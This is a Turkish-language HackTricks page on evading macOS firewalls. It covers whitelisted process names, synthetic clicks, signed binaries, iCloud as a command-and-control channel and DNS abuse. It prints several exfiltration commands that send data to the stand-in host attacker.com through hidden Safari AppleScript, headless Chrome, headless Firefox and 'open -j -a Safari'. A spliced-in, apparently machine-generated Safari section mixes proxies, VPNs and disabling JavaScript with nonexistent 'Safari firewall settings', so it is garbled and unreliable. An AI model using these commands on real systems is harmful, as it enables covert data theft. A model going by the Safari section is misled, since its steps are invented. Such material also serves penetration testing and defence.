# macOS Firewall Bypass Etme

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Bulunan teknikler

Aşağıdaki teknikler, bazı macOS güvenlik duvarı uygulamalarında çalıştığı tespit edilen tekniklerdir.

### Beyaz liste isimlerini kötüye kullanma

* Örneğin, kötü amaçlı yazılımı **`launchd`** gibi iyi bilinen macOS işlemleri adlarıyla çağırma

### Sentetik Tıklama

* Güvenlik duvarı kullanıcıdan izin istiyorsa, kötü amaçlı yazılımın **izin ver'e tıklamasını** sağlama

### **Apple imzalı ikili dosyaları kullanma**

* **`curl`** gibi, aynı zamanda **`whois`** gibi diğerleri de

### İyi bilinen apple alan adları

Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alan adlarına bağlantılara izin verebilir. Ve iCloud bir C2 olarak kullanılabilir.

### Genel Bypass

Güvenlik duvarını atlamak için denenebilecek bazı fikirler

### İzin verilen trafiği kontrol etme

İzin verilen trafiği bilmek, potansiyel olarak beyaz listeye alınmış alan adlarını veya bunlara erişime izin verilen uygulamaları belirlemenize yardımcı olacaktır.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS Kötüye Kullanma

DNS çözümlemeleri, muhtemelen DNS sunucularına erişime izin verilecek olan **`mdnsreponder`** adlı uygulama aracılığıyla yapılır.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tarayıcı Uygulamaları Aracılığıyla

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# Safari

Safari, Apple'ın varsayılan web tarayıcısıdır. macOS üzerinde çalışır ve güvenlik önlemleriyle donatılmıştır. Ancak, bazı durumlarda güvenlik duvarını atlamak için bazı teknikler kullanılabilir.

## 1. Proxy Sunucusu Kullanma

Proxy sunucusu kullanarak, internet trafiğinizi başka bir sunucu üzerinden yönlendirebilir ve güvenlik duvarını atlayabilirsiniz. Bu, IP adresinizi gizlemek ve engellenmiş web sitelerine erişmek için etkili bir yöntemdir.

Proxy sunucusu ayarlarını Safari'de yapılandırmak için aşağıdaki adımları izleyin:

1. Safari'yi açın ve "Tercihler"i seçin.
2. "Gelişmiş" sekmesine gidin ve "Değiştir" düğmesine tıklayın.
3. "Proxies" sekmesine gidin ve "Web Proxy (HTTP)" seçeneğini işaretleyin.
4. Proxy sunucusunun IP adresini ve port numarasını girin.
5. "Tamam" düğmesine tıklayın ve ayarları kaydedin.

## 2. VPN Kullanma

VPN (Virtual Private Network), internet trafiğinizi şifreleyerek güvenli bir şekilde iletmek için kullanılan bir teknolojidir. VPN kullanarak, güvenlik duvarını atlayabilir ve internet trafiğinizi başka bir konumdan yönlendirebilirsiniz.

Safari'de VPN kullanmak için aşağıdaki adımları izleyin:

1. Bir VPN hizmeti sağlayıcısı seçin ve hesap oluşturun.
2. macOS üzerinde VPN ayarlarını yapılandırın.
3. Safari'yi açın ve "Tercihler"i seçin.
4. "Gelişmiş" sekmesine gidin ve "Değiştir" düğmesine tıklayın.
5. "Proxies" sekmesine gidin ve "Web Proxy (HTTP)" seçeneğini işaretleyin.
6. VPN sağlayıcınızın sunucusunun IP adresini ve port numarasını girin.
7. "Tamam" düğmesine tıklayın ve ayarları kaydedin.

## 3. JavaScript Devre Dışı Bırakma

JavaScript, web sitelerinde etkileşimli öğelerin çalışmasını sağlayan bir programlama dilidir. Ancak, bazı durumlarda güvenlik duvarını atlamak için JavaScript'i devre dışı bırakabilirsiniz.

Safari'de JavaScript'i devre dışı bırakmak için aşağıdaki adımları izleyin:

1. Safari'yi açın ve "Tercihler"i seçin.
2. "Gelişmiş" sekmesine gidin ve "Değiştir" düğmesine tıklayın.
3. "Gelişmiş" sekmesinde "Web sitesi kullanımı" bölümüne gidin.
4. "JavaScript'i etkinleştir" seçeneğini kaldırın.
5. "Tamam" düğmesine tıklayın ve ayarları kaydedin.

Bu yöntem, bazı web sitelerinin düzgün çalışmamasına neden olabilir, bu nedenle dikkatli olun.

## 4. Güvenlik Duvarı Ayarlarını Değiştirme

Safari'de güvenlik duvarı ayarlarını değiştirerek, engellenmiş web sitelerine erişebilirsiniz. Ancak, bu yöntem, güvenlik açıklarına neden olabilir ve bilgisayarınızı risk altına sokabilir.

Güvenlik duvarı ayarlarını değiştirmek için aşağıdaki adımları izleyin:

1. Safari'yi açın ve "Tercihler"i seçin.
2. "Gelişmiş" sekmesine gidin ve "Değiştir" düğmesine tıklayın.
3. "Gelişmiş" sekmesinde "Web sitesi kullanımı" bölümüne gidin.
4. "Güvenlik" sekmesine gidin ve "Web sitesi izinleri"ni seçin.
5. Engellenmiş web sitelerini bulun ve "İzin Ver" seçeneğini işaretleyin.
6. "Tamam" düğmesine tıklayın ve ayarları kaydedin.

Bu yöntem, güvenlik duvarını atlamak için etkili olabilir, ancak dikkatli olun ve yalnızca güvendiğiniz web sitelerine erişin.
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Süreç enjeksiyonu ile

Eğer herhangi bir sunucuya bağlanmasına izin verilen bir sürece **kod enjekte edebilirseniz**, güvenlik duvarı korumalarını atlayabilirsiniz:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referanslar

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
